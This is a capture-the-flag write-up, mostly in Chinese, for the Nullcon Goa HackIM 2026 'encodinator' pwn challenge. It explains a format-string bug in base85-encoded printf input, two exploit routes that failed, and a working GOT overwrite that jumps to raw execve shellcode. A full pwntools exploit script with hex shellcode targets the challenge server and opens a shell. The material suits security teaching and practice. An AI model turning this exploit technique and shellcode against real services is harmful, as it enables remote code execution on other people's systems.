---
title: "encodinator - Nullcon Goa HackIM 2026 CTF"
category: "pwn"
subcategory: "rop"
type: "writeup"
tags: ["got-overwrite", "format-string", "pwn", "shellcode", "canary", "pie", "radare2", "lsb", "rop", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "\\- Local directory: pwn/encodinator"
source:
  name: "CTFtime writeup #40550"
  url: "https://ctftime.org/writeup/40550"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "encodinator"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** encodinator
- **Author team:** 正规子群.AI
- **CTFtime tags:** got-overwrite, format-string, pwn
- **CTFtime:** <https://ctftime.org/writeup/40550>

---
## 125 encodinator

\- Category: `pwn`  
\- Value: `395`  
\- Solves: `36`  
\- Solved by me: `True`  
\- Local directory: `pwn/encodinator`

### 题目描述  
> I've written a small tool to do some encoding me for. Can you exploit it?  
>  
> Author: @gehaxelt

### 连接信息  
\- `52.59.124.14:5012`

### 附件下载地址  
\- `<https://ctf.nullcon.net/files/e3d9cd4d640e96d0aa29a411f036e047/public.zip?token=eyJ1c2VyX2lkIjo1MDYyLCJ0ZWFtX2lkIjoyMzEyLCJmaWxlX2lkIjo5N30.aYqlRQ.TililownaREIm9vJPnAGhPDu8VQ>`

### 内存布局  
\- Binary path: `pwn/encodinator/task/encodinator`  
\- File type: `ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a4bff4c9bc475b5d03e8a56e5fb36a6268f2d843, for GNU/Linux 3.2.0, not stripped`  
\- arch: `x86`  
\- bits: `64`  
\- class: `ELF64`  
\- bintype: `elf`  
\- machine: `AMD x86-64 architecture`  
\- endian: `little`  
\- os: `linux`  
\- pic: `false`  
\- nx: `false`  
\- canary: `false`  
\- relro: `no`  
\- stripped: `false`  
\- baddr: `0x400000`

```text  
nth paddr size vaddr vsize perm flags type name  
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――  
0 0x00000000 0x0 0x00000000 0x0 ---- 0x0 NULL  
1 0x000002e0 0x1c 0x004002e0 0x1c -r-- 0x2 PROGBITS .interp  
2 0x00000300 0x30 0x00400300 0x30 -r-- 0x2 NOTE .note.gnu.property  
3 0x00000330 0x24 0x00400330 0x24 -r-- 0x2 NOTE .note.gnu.build-id  
4 0x00000354 0x20 0x00400354 0x20 -r-- 0x2 NOTE .note.ABI-tag  
5 0x00000378 0x28 0x00400378 0x28 -r-- 0x2 GNU_HASH .gnu.hash  
6 0x000003a0 0x138 0x004003a0 0x138 -r-- 0x2 DYNSYM .dynsym  
7 0x000004d8 0x81 0x004004d8 0x81 -r-- 0x2 STRTAB .dynstr  
8 0x0000055a 0x1a 0x0040055a 0x1a -r-- 0x2 GNU_VERSYM .gnu.version  
9 0x00000578 0x30 0x00400578 0x30 -r-- 0x2 GNU_VERNEED .gnu.version_r  
10 0x000005a8 0x60 0x004005a8 0x60 -r-- 0x2 RELA .rela.dyn  
11 0x00000608 0xc0 0x00400608 0xc0 -r-- 0x42 RELA .rela.plt  
12 0x00001000 0x1b 0x00401000 0x1b -r-x 0x6 PROGBITS .init  
13 0x00001020 0x90 0x00401020 0x90 -r-x 0x6 PROGBITS .plt  
14 0x000010b0 0x80 0x004010b0 0x80 -r-x 0x6 PROGBITS .plt.sec  
15 0x00001130 0x36f 0x00401130 0x36f -r-x 0x6 PROGBITS .text  
16 0x000014a0 0xd 0x004014a0 0xd -r-x 0x6 PROGBITS .fini  
17 0x00002000 0x77 0x00402000 0x77 -r-- 0x2 PROGBITS .rodata  
18 0x00002078 0x3c 0x00402078 0x3c -r-- 0x2 PROGBITS .eh_frame_hdr  
19 0x000020b8 0xc4 0x004020b8 0xc4 -r-- 0x2 PROGBITS .eh_frame  
20 0x00002180 0x8 0x00403180 0x8 -rw- 0x3 INIT_ARRAY .init_array  
21 0x00002188 0x8 0x00403188 0x8 -rw- 0x3 FINI_ARRAY .fini_array  
22 0x00002190 0x1d0 0x00403190 0x1d0 -rw- 0x3 DYNAMIC .dynamic  
23 0x00002360 0x10 0x00403360 0x10 -rw- 0x3 PROGBITS .got  
24 0x00002370 0x58 0x00403370 0x58 -rw- 0x3 PROGBITS .got.plt  
25 0x000023c8 0x10 0x004033c8 0x10 -rw- 0x3 PROGBITS .data  
26 0x000023d8 0x0 0x004033e0 0x20 -rw- 0x3 NOBITS .bss  
27 0x000023d8 0x2d 0x00000000 0x2d ---- 0x30 PROGBITS .comment  
28 0x00002408 0x420 0x00000000 0x420 ---- 0x0 SYMTAB .symtab  
29 0x00002828 0x25a 0x00000000 0x25a ---- 0x0 STRTAB .strtab  
```

### WP  
# encodinator nullcon pwn 500

\---  
## 1. 题目与目标

目标是利用 `printf(mmap_buf)` 的格式化字符串漏洞拿到远端 shell 并读取 flag。

程序特征：  
\- 非 PIE，`No RELRO`，栈可执行。  
\- 固定 `mmap(0x40000000, 0x1000, PROT_RWX, ...)`。  
\- 读入原始输入后先做 base85 编码，再把编码结果当作 `printf` 的 format string。

\---  
## 2. 静态分析与内存布局r2/gdb

我先做纯静态分析，再做调试验证。

关键命令（示例）：  
```bash  
r2 -A dist/encodinator  
afl  
pdf @ sym.main  
```

`main` 关键路径（省略无关调用）：  
1\. `read(0, rbp-0x110, 0x100)`  
2\. `base85_encode(buf, len, [rbp-0x10])`，其中 `[rbp-0x10] = 0x40000000`  
3\. `printf(0x40000000)`  
4\. `puts("...")`

关键地址：  
\- `puts@got = 0x403390`  
\- `read@got = 0x4033b0`  
\- `main+read块入口 = 0x4013ea`  
\- `call rax` gadget = `0x401014`

栈布局（`printf` 调用点）可利用事实：  
\- 第 6 个参数开始落在调用者栈区，覆盖到 `rbp-0x110` 这片可控输入区。  
\- 可通过位置参数 `%<idx>$hhn` 把尾部地址当作写目标。

\---  
## 3. 约束与失败路线

### 3.1 失败路线 1：直接 `puts@got -> 0x40000000`

把执行流直接打到 mmap 里的 ASCII shellcode（`pay1`）会崩。原因是寄存器上下文不匹配，解码器中间指令访问非法地址。

### 3.2 失败路线 2：`puts@got -> 0x4013ea` 后二次格式化

这个路线会进入第二轮 `read`，但第二轮 `printf` 栈对齐不满足 glibc 预期，容易在 libc 内崩溃，无法稳定二次改写 GOT。

\---  
## 4. 最终可稳定利用思路

核心改成“首轮一次性改两个 GOT”：  
1\. `puts@got -> 0x4013ea`，让流程回到 `read` 代码块。  
2\. `read@got -> 0x401014 (call rax)`。

这样第二轮执行到 `call read` 时，不会进 libc 的 `read`，而是执行 `call rax`。

此时 `rax` 在 `0x4013ea` 前被设置为 `rbp-0x110`（原始输入缓冲区地址），所以 `call rax` 直接跳到“第一轮原始输入里的机器码”。

重点：  
\- 这段原始输入机器码不受 base85 输出字符集限制（因为执行的是 raw buffer，不是编码文本）。  
\- 我放的是标准 amd64 `execve('/bin///sh')` shellcode。

\---  
## 5. Payload 构造细节

设：  
\- 原始 shellcode 长度 $L=52$（按 4 字节对齐）。  
\- 原始格式化区长度 $F=100$（对应编码长度 $125$）。  
\- 则地址区起点参数索引：$K = 6 + \frac{L+F}{8} = 25$。

写入策略：  
\- 用 `%hhn` 按字节写 `puts@got` 与 `read@got` 的低 6 字节。  
\- 写值按升序排序，控制累计输出计数 `count`，每步增量为  
$d = (target - count) \bmod 256$。

原始 payload 结构：  
\- `[shellcode_raw][raw_fmt_block][packed_addresses]`  
\- 总长度 `248`，满足 `<= 256`。

\---  
## 6. 本地与远端验证

最终脚本：`solution/[solution.py](http://solution.py)`

运行：  
```bash  
python3 solution/[solution.py](http://solution.py) REMOTE  
```

脚本完成动作：  
1\. 发送一次 exploit payload。  
2\. 获得 shell。  
3\. 执行 `cat /home/ctf/flag.txt`。

拿到 flag：

```txt  
ENO{b85_fmt_str_g0t_0verwr1t3}  
```

\---  
## 7. 文件结构

\- `solution/[solution.py](http://solution.py)`：最终利用脚本（已实测拿到远端 flag）  
\- `task/encodinator` 与 `task/lib/*`：题目附件副本

### Exploit  
#### pwn/encodinator/solution/[solution.py](http://solution.py)

```python  
#!/usr/bin/env python3  
import os, sys  
# Ensure consistent terminal behavior  
os.environ.update({'PWNLIB_NOTERM': '1', 'TERM': 'linux'})

# KEEP EXACTLY AS IS: prevents namespace conflict with math.log  
from pwn import process, remote, context, log as pwnlog

import struct  
import time  
from pwnlib.args import args

HOST = '52.59.124.14'  
PORT = 5012

PUTS_GOT = 0x403390  
READ_GOT = 0x4033B0

PUTS_LOOP = 0x4013EA  
CALL_RAX = 0x401014

context.log_level = 'debug' if args.get('DEBUG') else 'info'

# amd64 execve('/bin///sh') shellcode with one NOP prefix, padded to 4-byte boundary  
SHELLCODE = bytes.fromhex(  
'906a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05909090'  
)

def b85_encode(data: bytes) -> str:  
out = []  
i = 0  
while i < len(data):  
n = min(4, len(data) - i)  
v = 0  
for j in range(4):  
v = (v << 8) | (data[i + j] if j < n else 0)  
t = []  
for _ in range(5):  
t.append(chr(v % 85 + 33))  
v //= 85  
out.extend(t[: n + 1][::-1])  
i += 4  
return ''.join(out)

def b85_decode_full5(s: str) -> bytes:  
if len(s) % 5 != 0:  
raise ValueError('base85 string length must be multiple of 5')  
out = bytearray()  
for i in range(0, len(s), 5):  
v = 0  
chunk = s[i:i + 5]  
for c in chunk:  
d = ord(c) - 33  
if not (0 <= d < 85):  
raise ValueError(f'invalid char at block {i // 5}: {chunk!r}')  
v = v * 85 + d  
if v >= (1 << 32):  
raise ValueError(f'overflow block {i // 5}: {chunk!r}')  
out += v.to_bytes(4, 'big')  
return bytes(out)

def build_payload() -> bytes:  
if len(SHELLCODE) % 4 != 0:  
raise ValueError('shellcode must be 4-byte aligned for chunk-safe concatenation')

enc_sc = b85_encode(SHELLCODE)  
if '%' in enc_sc:  
raise ValueError('encoded shellcode contains %, unsafe for format-string phase')

writes = []  
for base, value in ((PUTS_GOT, PUTS_LOOP), (READ_GOT, CALL_RAX)):  
b = value.to_bytes(8, 'little')  
for i in range(6):  
writes.append((base + i, b[i]))

writes.sort(key=lambda x: x[1])

# raw layout: [shellcode][raw_fmt][addresses]  
raw_fmt_len = 100  
encoded_fmt_len = (raw_fmt_len // 4) * 5 # 125

before_addrs_len = len(SHELLCODE) + raw_fmt_len  
if before_addrs_len % 8 != 0:  
raise ValueError('before_addrs_len must be 8-byte aligned')  
k = 6 + before_addrs_len // 8

count = len(enc_sc)  
fmt = ''  
for i, (_, target_byte) in enumerate(writes):  
d = (target_byte - count) % 256  
if d:  
fmt += f'%1${d}c'  
count = (count + d) % 256  
fmt += f'%{k + i}$hhn'

if len(fmt) > encoded_fmt_len:  
raise ValueError(f'fmt too long: {len(fmt)} > {encoded_fmt_len}')  
fmt = fmt + 'A' * (encoded_fmt_len - len(fmt))

raw_fmt = b85_decode_full5(fmt)  
if len(raw_fmt) != raw_fmt_len:  
raise ValueError('raw fmt length mismatch')

addr_raw = b''.join(struct.pack('<Q', addr) for addr, _ in writes)

payload = SHELLCODE + raw_fmt + addr_raw  
if len(payload) > 256:  
raise ValueError(f'payload too long: {len(payload)}')

# Consistency checks  
enc_total = b85_encode(payload)  
if not enc_total.startswith(enc_sc):  
raise ValueError('encoded shellcode prefix mismatch')  
if enc_total[len(enc_sc):len(enc_sc) + encoded_fmt_len] != fmt:  
raise ValueError('encoded fmt mismatch')

[pwnlog.info](http://pwnlog.info)(f'payload length = {len(payload)}')  
return payload

def run(io, cmd: str | None = None, interactive: bool = False):  
payload = build_payload()

io.recvuntil(b'text:')  
io.sendline(payload)

# Let first phase complete and /bin/sh come up.  
time.sleep(0.25)

if interactive:  
io.interactive()  
return

if cmd is None:  
cmd = 'id; uname -srm; echo __PWNED__'

io.sendline(cmd.encode())  
time.sleep(0.2)  
io.sendline(b'exit')

data = io.recvall(timeout=3)  
[pwnlog.info](http://pwnlog.info)(f'recv {len(data)} bytes')

if b'__PWNED__' in data:  
pwnlog.success('RCE marker found (__PWNED__)')  
elif cmd != 'id; uname -srm; echo __PWNED__':  
[pwnlog.info](http://pwnlog.info)('custom command executed; output dumped below')  
else:  
pwnlog.warning('RCE marker not found; dumping output below')  
print(data.decode('latin-1', errors='ignore'))

def main():  
user_cmd = args.get('CMD')  
shell_mode = bool(args.get('SHELL')) or any(arg.upper() == 'SHELL' for arg in sys.argv[1:])  
if user_cmd is None:  
for arg in sys.argv[1:]:  
if arg.startswith('CMD='):  
user_cmd = arg.split('=', 1)[1]

use_remote = bool(args.get('REMOTE')) or any(arg.upper() == 'REMOTE' for arg in sys.argv[1:])  
if use_remote:  
io = remote(HOST, PORT)  
else:  
io = process(['./dist/encodinator'])

try:  
run(io, cmd=user_cmd, interactive=shell_mode)  
finally:  
io.close()

if __name__ == '__main__':  
main()  
```

\---
